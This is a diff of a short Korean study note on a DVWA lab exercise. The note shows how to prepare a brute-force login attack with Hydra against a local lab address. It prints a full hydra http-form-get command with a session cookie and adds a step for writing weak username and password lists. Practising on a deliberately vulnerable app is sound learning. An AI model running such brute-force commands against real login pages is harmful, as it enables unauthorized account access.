@@ -16,3 +16,6 @@
 - 히드라 툴을 사용해 공격 준비
 ![[Pasted image 20241007094847.png]]
 ![[Pasted image 20241007095355.png]]hydra 192.168.56.118 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low;PHPSESSID:aqsgn666ja2jubcdvc40euees2"
+![[Pasted image 20241007100635.png]]
+- 취약한 아이디 리스트 / 패스워드 리스트 파일을 작성하고 명령어에 사용하도록 입력
+- 
